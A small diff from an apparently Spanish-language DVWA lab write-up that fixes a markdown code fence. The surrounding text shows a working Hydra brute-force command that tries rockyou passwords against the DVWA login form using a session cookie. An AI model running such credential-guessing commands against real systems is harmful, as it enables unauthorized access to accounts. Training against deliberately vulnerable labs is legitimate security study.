@@ -11,7 +11,7 @@ Aunque la inyección SQL directa está bloqueada, aún podemos intentar un ataqu
 **Comando:**
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_SERVIDOR> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<TU_SESION>;security=medium:F=Username and/or password incorrect."
-``
+```
 
 Nota: Reemplaza <IP_SERVIDOR> con la dirección IP de tu servidor DVWA y <TU_SESION> con el valor actual de tu cookie PHPSESSID.
 
